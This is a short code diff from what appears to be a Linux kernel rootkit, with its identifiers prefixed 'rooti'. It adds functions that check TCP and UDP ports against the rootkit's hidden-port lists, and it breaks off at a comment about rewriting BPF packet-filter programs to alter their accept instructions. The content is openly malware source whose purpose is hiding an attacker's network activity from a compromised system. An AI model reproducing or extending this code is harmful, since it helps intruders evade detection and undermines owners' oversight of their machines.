@@ -1,10 +1,32 @@
 #include <linux/socket.h>
 #include <linux/filter.h>
-#include "traffic.h"
+#include "net.h"
 #include "../../utils.h"
 #include "../../config.h"
 
 static const int ROOTI_MAX_BPF_PROGRAM_LEN = 255;
+
+// Indicates whether the given TCP port should be hidden by the rootkit
+bool rooti_should_hide_tcp_port(unsigned short port)
+{
+    for (int i = 0; i < ROOTI_HIDDEN_TCP_PORTS_COUNT; i++) {
+        if (ROOTI_HIDDEN_TCP_PORTS[i] == port) {
+            return true;
+        }
+    }
+    return false;
+}
+
+// Indicates whether the given UDP port should be hidden by the rootkit
+bool rooti_should_hide_udp_port(unsigned short port)
+{
+    for (int i = 0; i < ROOTI_HIDDEN_UDP_PORTS_COUNT; i++) {
+        if (ROOTI_HIDDEN_UDP_PORTS[i] == port) {
+            return true;
+        }
+    }
+    return false;
+}
 
 /*
     Replace ret instructions with a positive return value (e.g instructions to 'accept' the packet) with a jump instruction
